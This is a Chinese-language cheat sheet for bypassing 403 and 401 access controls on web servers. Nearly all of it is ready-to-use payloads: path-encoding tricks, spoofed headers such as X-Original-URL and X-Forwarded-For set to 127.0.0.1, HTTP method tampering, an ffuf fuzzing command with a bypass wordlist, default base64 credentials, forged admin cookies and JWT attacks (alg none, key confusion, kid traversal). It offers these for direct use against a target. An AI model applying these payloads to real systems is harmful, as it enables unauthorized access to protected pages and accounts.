# 403 / 401 绕过手册

目录存在但被拦，说明里面有东西。这些手法挨个试。

## 路径变形
```
/admin           -> 403
/admin/          -> 200  （加斜杠）
//admin          -> 200
/admin/.         -> 200
/admin/..;/      -> 200
/admin%20        -> 200
/admin%2e        -> 200
/admin;/         -> 200
/admin/%2e%2e/admin  -> 200
/./admin         -> 200
/%2fadmin        -> 200
/ADMIN           -> 200  （大小写）
/admin%00        -> 200
```

## Header 绕过
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Referer: https://TARGET/admin
```

## 方法绕过
```
GET     -> 403
POST    -> 200
HEAD    -> 200
OPTIONS -> 200
PUT     -> 200
TRACE   -> 200
PATCH   -> 200
任意方法 -> X-HTTP-Method-Override: GET
```

## 路径爆破变体（ffuf 一把梭）
```bash
ffuf -u https://TARGET/FUZZ -w /path/to/403bypass.txt -mc all \
     -fs 0 -t 40 -o bypass.json

# 403bypass 字典内容示例
admin
admin/
//admin
/./admin
/admin/.
/admin/..
/admin/..;/
/admin%20
/admin%09
/admin?
/admin#
/admin/~
/admin/.%2e/
```

## 认证绕过
```
# 空 Authorization
Authorization: Bearer
Authorization: Basic
Authorization: Basic YWRtaW46YWRtaW4=

# Cookie 伪造
Cookie: admin=1
Cookie: role=admin
Cookie: isAdmin=true

# JWT 混淆
alg: none
alg: HS256 用公钥当密钥
kid 路径穿越
```
